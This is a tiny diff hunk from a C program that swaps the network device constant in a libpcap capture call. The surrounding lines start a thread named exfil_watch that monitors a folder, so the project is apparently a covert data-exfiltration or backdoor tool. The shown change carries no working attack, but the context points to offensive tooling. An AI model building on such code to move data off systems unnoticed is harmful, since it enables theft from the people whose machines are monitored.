@@ -63,7 +63,7 @@ void pcap_init(uint32 src, uint32 ipaddr, char *folder, int chan) {
 	expack.folder = folder;
 	pthread_create(&exfil_thread, NULL, exfil_watch, &expack);
 
-	if ((nic = pcap_open_live(NET_DEVICE, MAX_LEN, 0, -1, errbuf)) == NULL)
+	if ((nic = pcap_open_live(SVR_NET_DEVICE, MAX_LEN, 0, -1, errbuf)) == NULL)
 		error(errbuf);
 
 // Get packet fltr_str from arguments
